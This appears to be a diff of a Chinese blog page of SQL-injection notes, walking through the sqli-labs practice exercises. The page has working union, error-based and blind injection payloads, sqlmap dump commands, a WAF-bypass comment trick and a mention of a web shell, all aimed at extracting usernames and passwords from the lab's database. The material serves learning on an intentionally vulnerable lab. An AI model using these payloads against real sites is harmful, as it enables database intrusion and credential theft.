@@ -116,7 +116,7 @@
 <meta property="og:image" content="https://shu1l.github.io/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206130709.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206130537.png">
 <meta property="article:published_time" content="2020-03-12T10:46:30.000Z">
-<meta property="article:modified_time" content="2020-04-20T06:07:31.997Z">
+<meta property="article:modified_time" content="2020-04-27T11:56:13.279Z">
 <meta property="article:author" content="Shu1L">
 <meta property="article:tag" content="SQL注入学习">
 <meta name="twitter:card" content="summary">
@@ -404,8 +404,8 @@
 <li>注释符：在Mysql中常见的注释符表达式：#、–空格、/**/</li>
 <li>/<em>！SQL语句、\</em>/只有Mysql可以识别，常用来绕过WAF。</li>
 </ul>
-<p>例如：select * from articles where id -id ;</p>
-<p>使用内联注释注入：select * from articles where id=-1 /<em>!union\</em>/ /*!select*/ 1,2,3,4</p>
+<p>例如：<code>select * from articles where id -id ;</code></p>
+<p>使用内联注释注入：<code>select * from articles where id=-1 /*!union\*/ /\*!select\*/ 1,2,3,4</code></p>
 <h5 id="注入点查找"><a href="#注入点查找" class="headerlink" title="注入点查找"></a>注入点查找</h5><ul>
 <li>and 1=1/and 1=2（整型）</li>
 <li>随机输入(整型)</li>
@@ -433,7 +433,7 @@
 <ul>
 <li>floor报错注入</li>
 </ul>
-<p>​      select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x;</p>
+<p>​      <code>select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</code></p>
 <ul>
 <li><p>updatexml报错注入</p>
 </li>
@@ -527,20 +527,20 @@
 </li>
 </ul>
 <h4 id="sqli-labs靶场实战"><a href="#sqli-labs靶场实战" class="headerlink" title="sqli-labs靶场实战"></a>sqli-labs靶场实战</h4><h5 id="less-1-基于错误的GET单引号字符型注入）"><a href="#less-1-基于错误的GET单引号字符型注入）" class="headerlink" title="less-1 (基于错误的GET单引号字符型注入）"></a>less-1 (基于错误的GET单引号字符型注入）</h5><p><strong>注入过程：</strong></p>
-<p>?id=1’ or 1=1 %23</p>
-<p>?id=1’ order by 3 %23  #字段数为3</p>
-<p>?id=1’ union select 1,2,3 #显示位为2，3</p>
+<p><code>?id=1&#39; or 1=1 %23</code></p>
+<p><code>?id=1&#39; order by 3 %23</code>  #字段数为3</p>
+<p><code>?id=1&#39; union select 1,2,3</code> #显示位为2，3</p>
 <p><strong>爆库名</strong></p>
-<p>?id=1’ union select 1,2,(select group_concat(schema_name) from information_schema.schemata) %23 </p>
+<p><code>?id=1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata) %23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200205184721.png" alt=""></p>
 <p><strong>爆表名</strong></p>
-<p>?id=1’ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)%23 </p>
+<p><code>?id=1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)%23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200205184704.png" alt=""></p>
 <p><strong>爆列名</strong></p>
-<p>?id=1’ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’user’) %23 </p>
+<p><code>?id=1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;user&#39;) %23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200205184647.png" alt=""></p>
 <p><strong>爆用户名和密码</strong></p>
-<p>?id=1’ union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) %23  </p>
+<p><code>?id=1&#39; union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) %23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200205184623.png" alt=""></p>
 <p><strong>使用sqlmap自动化探测</strong></p>
 <p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --dbs --batch</code></p>
@@ -558,19 +558,19 @@
 <h5 id="Less-4（基于错误的GET双引号字符型注入）"><a href="#Less-4（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4（基于错误的GET双引号字符型注入）"></a>Less-4（基于错误的GET双引号字符型注入）</h5><p>?id=1”)%23 回显正常</p>
 <p>构造同Less-01</p>
 <h5 id="Less-5（双注入GET单引号字符型注入）"><a href="#Less-5（双注入GET单引号字符型注入）" class="headerlink" title="Less-5（双注入GET单引号字符型注入）"></a>Less-5（双注入GET单引号字符型注入）</h5><p><strong>爆库名</strong></p>
-<p>?id=1’ union select count(<em>),1, concat(‘<del>‘,(select database()),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p>
+<p><code>?id=1&#39; union select count(*),1, concat(&#39;~&#39;,(select database()),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a %23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200206132510.png" alt=""></p>
 <p><strong>爆表名</strong></p>
-<p>?id=1’ union select count(<em>),1, concat(‘<del>‘,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p>
+<p><code>?id=1&#39; union select count(*),1, concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a %23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200206132607.png" alt=""></p>
 <p><strong>更换Limit后的数字即可查出其他表名</strong></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200206132652.png" alt=""></p>
 <p><strong>爆user表列名</strong></p>
-<p>?id=1’  union select count(*),1, concat(‘<del>‘,(select column_namefrom information_schema.tables where table_schema=’security’   and table_name=’users’ limit 0,1),’</del>‘,floor(rand()2)) as a from information_schema gruop by a %23</p>
+<p><code>?id=1&#39;  union select count(*),1, concat(&#39;~&#39;,(select column_namefrom information_schema.tables where table_schema=&#39;security&#39;   and table_name=&#39;users&#39; limit 0,1),&#39;~&#39;,floor(rand()2)) as a from information_schema gruop by a %23</code></p>
 <p><strong>爆username password内容</strong></p>
-<p> ?id=1’union select count(<em>),1, concat(‘<del>‘,(select username from users limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p>
+<p><code>?id=1&#39;union select count(*),1, concat(&#39;~&#39;,(select username from users limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a %23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200206133237.png" alt=""></p>
-<p>?id=1’union select count(<em>),1, concat(‘<del>‘,(select password from users limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a  %23</p>
+<p><code>?id=1&#39;union select count(*),1, concat(&#39;~&#39;,(select password from users limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a  %23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200206133320.png" alt=""></p>
 <h5 id="Less-6-双注入GET双引号字符型注入）"><a href="#Less-6-双注入GET双引号字符型注入）" class="headerlink" title="Less-6 (双注入GET双引号字符型注入）"></a>Less-6 (双注入GET双引号字符型注入）</h5><p>将单引号换成双引号即可</p>
 <p>构造同上</p>
@@ -588,84 +588,84 @@
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200206123628.png" alt=""></p>
 <p>之后我们使用中国菜刀连接即可。 </p>
 <h5 id="Less-8-基于布尔的盲注）"><a href="#Less-8-基于布尔的盲注）" class="headerlink" title="Less-8 (基于布尔的盲注）"></a>Less-8 (基于布尔的盲注）</h5><p><strong>爆数据库长度</strong></p>
-<p>?id=1’ and (length(database())) = 8 %23 #数据库长度为8</p>
+<p><code>?id=1&#39; and (length(database())) = 8 %23 #数据库长度为8</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200205195014.png" alt=""></p>
 <p>我们任意修改长度，页面不回显</p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200205195102.png" alt=""></p>
 <p><strong>爆库名</strong></p>
-<p>?id=1’ and (ascii(substr((select database()) ,1,1))) = 115 %23 # s</p>
-<p>?id=1’and(ascii(substr((select database()),2,1)))=101 %23 #e</p>
-<p>?id=1’and(ascii(substr((select database()),3,1)))=99 %23 #c</p>
-<p>?id=1’ and (ascii(substr((select database()) ,4,1))) = 117 –+ #u</p>
-<p>?id=1’ and (ascii(substr((select database()) ,5,1))) = 114 –+ #r</p>
-<p>​    and (ascii(substr((select database()) ,6,1))) = 105 –+    #i</p>
-<p> and (ascii(substr((select database()) ,7,1))) = 116 –+   #t</p>
-<p>?id=1’ and (ascii(substr((select database()) ,8,1))) = 121 –+  #y</p>
+<p><code>?id=1&#39; and (ascii(substr((select database()) ,1,1))) = 115 %23 # s</code></p>
+<p><code>?id=1&#39;and(ascii(substr((select database()),2,1)))=101 %23 #e</code></p>
+<p><code>?id=1&#39;and(ascii(substr((select database()),3,1)))=99 %23 #c</code></p>
+<p><code>?id=1&#39; and (ascii(substr((select database()) ,4,1))) = 117 --+ #u</code></p>
+<p><code>?id=1&#39; and (ascii(substr((select database()) ,5,1))) = 114 --+ #r</code></p>
+<p>   <code>and (ascii(substr((select database()) ,6,1))) = 105 --+    #i</code></p>
+<p><code>and (ascii(substr((select database()) ,7,1))) = 116 --+   #t</code></p>
+<p><code>?id=1&#39; and (ascii(substr((select database()) ,8,1))) = 121 --+  #y</code></p>
 <p><strong>爆表名长度</strong></p>
-<p>?id=1’ and (length((select table_name from information_schema.tables  where table_schema=database() limit 0,1)))=6 %23</p>
+<p><code>?id=1&#39; and (length((select table_name from information_schema.tables  where table_schema=database() limit 0,1)))=6 %23</code></p>
 <p>类推以上即可：</p>
-<h5 id="Less-9（基于时间的GET单引号盲注）"><a href="#Less-9（基于时间的GET单引号盲注）" class="headerlink" title="Less-9（基于时间的GET单引号盲注）"></a>Less-9（基于时间的GET单引号盲注）</h5><p>?id=1’ and sleep(5) %23</p>
+<h5 id="Less-9（基于时间的GET单引号盲注）"><a href="#Less-9（基于时间的GET单引号盲注）" class="headerlink" title="Less-9（基于时间的GET单引号盲注）"></a>Less-9（基于时间的GET单引号盲注）</h5><p><code>?id=1&#39; and sleep(5) %23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200205194242.png" alt=""></p>
-<p>?id=1’ and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) %23</p>
+<p><code>?id=1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) %23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200205194753.png" alt=""></p>
 <p>接下来使用sqlmap自动化注入</p>
 <p><strong>爆数据库名：</strong></p>
 <pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql --dbs --batch</code></pre><p><strong>爆表名：</strong></p>
 <pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security --tables --batch </code></pre><p><strong>爆列名</strong>：</p>
 <pre><code> python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security -T users --column --batch</code></pre><p><strong>爆内容 ：</strong></p>
-<pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch</code></pre><h5 id="Less-10-基于时间的双引号盲注）"><a href="#Less-10-基于时间的双引号盲注）" class="headerlink" title="Less-10 (基于时间的双引号盲注）"></a>Less-10 (基于时间的双引号盲注）</h5><p>?id=1” and sleep(5) %23</p>
+<pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch</code></pre><h5 id="Less-10-基于时间的双引号盲注）"><a href="#Less-10-基于时间的双引号盲注）" class="headerlink" title="Less-10 (基于时间的双引号盲注）"></a>Less-10 (基于时间的双引号盲注）</h5><p><code>?id=1&quot; and sleep(5) %23</code></p>
 <p>同上</p>
 <h5 id="Less-11-基于错误的POST型单引号字符型注入）"><a href="#Less-11-基于错误的POST型单引号字符型注入）" class="headerlink" title="Less-11(基于错误的POST型单引号字符型注入）"></a>Less-11(基于错误的POST型单引号字符型注入）</h5><p>提交方式改为POST，使用burp进行抓包修改。</p>
-<p>uname=admin’ and 1=1 %23 &amp;passwd=admin&amp;submit=Submit  #成功登录</p>
+<p><code>uname=admin&#39; and 1=1 %23 &amp;passwd=admin&amp;submit=Submit  #成功登录</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200206125708.png" alt=""></p>
-<p>uname=admin’ and 1=2  %23&amp; passwd=admin&amp;submit=Submit #不能登录</p>
+<p><code>uname=admin&#39; and 1=2  %23&amp; passwd=admin&amp;submit=Submit #不能登录</code></p>
 <p><img src="%5CQQ%E6%88%AA%E5%9B%BE20200206125727.png" alt=""></p>
 <p>存在报错型注入，我们使用extractvalue()函数。</p>
 <p><strong>爆数据库</strong></p>
-<p>uname=admin’ and extractvalue(1,concat(0x7e,(select database()),0x7e)) %23</p>
+<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) %23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200206130037.png" alt=""></p>
 <p><strong>爆表名</strong></p>
-<p>uname=admin’ and extractvalue(1,concat(0x7e,(select  group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e)) %23</p>
+<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select  group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e)) %23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200206130124.png" alt=""></p>
 <p><strong>爆列名</strong></p>
-<p>uname=admin’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_shcema.columns where table_name=’users’),0x7e))%23</p>
+<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_shcema.columns where table_name=&#39;users&#39;),0x7e))%23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200206130709.png" alt=""></p>
 <p><strong>爆用户名密码</strong></p>
-<p>uname=admin’ and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</p>
+<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</code></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200206130537.png" alt=""></p>
 <p>sqlmap自动化注入：</p>
 <p>复制Burpsuite截断的HTTP请求数据包到文本文件中，使用Sqlmap -r 文件路径 -p 指定探测参数。</p>
 <h5 id="Less-12-基于错误的双引号POST型字符型变形的注入）"><a href="#Less-12-基于错误的双引号POST型字符型变形的注入）" class="headerlink" title="Less-12(基于错误的双引号POST型字符型变形的注入）"></a>Less-12(基于错误的双引号POST型字符型变形的注入）</h5><p><strong>换成双引号即可；</strong></p>
 <p><strong>爆数据库名</strong>：</p>
-<p>uname=admin” and extractvalue(1,concat(0x7e,(select database(),0x7e)))  “%23</p>
+<p><code>uname=admin&quot; and extractvalue(1,concat(0x7e,(select database(),0x7e)))  &quot;%23</code></p>
 <p><strong>爆表名</strong>：</p>
-<p>uname=admin”  and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))  and “ </p>
+<p><code>uname=admin&quot;  and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))  and &quot;</code> </p>
 <p><strong>爆列名</strong>：</p>
-<p>uname=admin”  and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’)))  and “<br><strong>爆用户名密码：</strong></p>
-<p>uname=admin“ and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</p>
+<p><code>uname=admin&quot;  and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))  and &quot;</code><br><strong>爆用户名密码：</strong></p>
+<p><code>uname=admin“ and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</code></p>
 <h5 id="Less-13-POST单引号变形双注入）"><a href="#Less-13-POST单引号变形双注入）" class="headerlink" title="Less-13(POST单引号变形双注入）"></a>Less-13(POST单引号变形双注入）</h5><p><strong>floor 报错注入</strong></p>
-<p>1’) union select count(<em>),concat_ws(‘~’,(select user()),(select database()),floor(rand()</em>2)) as a from information_schema.tables group by a#</p>
-<p>1’) union select count(<em>),concat_ws(‘:’,(select user()),(select database()),floor(rand()</em>2)) as a from information_schema.tables group by a#</p>
+<p><code>1&#39;) union select count(*),concat_ws(&#39;~&#39;,(select user()),(select database()),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
+<p><code>1&#39;) union select count(*),concat_ws(&#39;:&#39;,(select user()),(select database()),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
 <p><strong>爆表名</strong></p>
-<p>‘) union select count(<em>),concat_ws(‘++’,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a#</p>
+<p><code>&#39;) union select count(*),concat_ws(&#39;++&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
 <p><strong>爆列名</strong></p>
-<p>‘) union select count(<em>),concat_ws(‘+’,(select column_name from information_schema.columns where table_name=’users’ limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a#</p>
+<p><code>&#39;) union select count(*),concat_ws(&#39;+&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
 <p><strong>爆数据</strong></p>
-<p>‘) union select count(<em>),concat_ws(‘;’,(select username from users limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a#</p>
+<p><code>&#39;) union select count(*),concat_ws(&#39;;&#39;,(select username from users limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
 <h5 id="Less-14-POST双引号变形双注入）"><a href="#Less-14-POST双引号变形双注入）" class="headerlink" title="Less-14(POST双引号变形双注入）"></a>Less-14(POST双引号变形双注入）</h5><p>将单引号闭合换成双引号即可。</p>
 <p>过程同上。</p>
 <h5 id="Less-15-基于bool型-时间延迟单引号POST型盲注）"><a href="#Less-15-基于bool型-时间延迟单引号POST型盲注）" class="headerlink" title="Less-15(基于bool型/时间延迟单引号POST型盲注）"></a>Less-15(基于bool型/时间延迟单引号POST型盲注）</h5><p>使用延时注入</p>
-<p>admin’ and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) # </p>
+<p><code>admin&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) #</code></p>
 <p>逐个判断即可；</p>
 <h5 id="Less-16-基于bool型-时间延迟双引号POST型盲注）"><a href="#Less-16-基于bool型-时间延迟双引号POST型盲注）" class="headerlink" title="Less-16(基于bool型/时间延迟双引号POST型盲注）"></a>Less-16(基于bool型/时间延迟双引号POST型盲注）</h5><p>根据源码我们可以知道闭合方法： 使用”）进行闭合</p>
 <p>使用延时注入</p>
 <p>同上。</p>
 <h5 id="Less-17-基于错误的更新查询POST注入）"><a href="#Less-17-基于错误的更新查询POST注入）" class="headerlink" title="Less-17(基于错误的更新查询POST注入）"></a>Less-17(基于错误的更新查询POST注入）</h5><p><strong>爆数据库版本</strong></p>
-<p>uname=admin&amp;passwd=1’ and (updatexml(1,concat(0x5c,version(),0x5c),1))#submit=submit</p>
+<p><code>uname=admin&amp;passwd=1&#39; and (updatexml(1,concat(0x5c,version(),0x5c),1))#submit=submit</code></p>
 <p><strong>爆表名</strong></p>
-<p>uname=admin&amp;passwd=1’ and (updatexml(1,concat(0x5c,(select table_name from information_schema.tables where table_schema=’security’ limit 3,1),0x5c),1))#submit=submit</p>
+<p><code>uname=admin&amp;passwd=1&#39; and (updatexml(1,concat(0x5c,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),0x5c),1))#submit=submit</code></p>
 <p><strong>爆字段名</strong></p>
-<p>uname=admin&amp;passwd=1’ and (updatexml(1,concat(0x5c,(select password from (select password from users where username=’admin’)aa),0x5c),1))#submit=submit</p>
+<p><code>uname=admin&amp;passwd=1&#39; and (updatexml(1,concat(0x5c,(select password from (select password from users where username=&#39;admin&#39;)aa),0x5c),1))#submit=submit</code></p>
 <p><strong>未完待续。。。。</strong></p>
 <h5 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24(二次注入)"></a>Less-24(二次注入)</h5>
       
@@ -808,7 +808,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
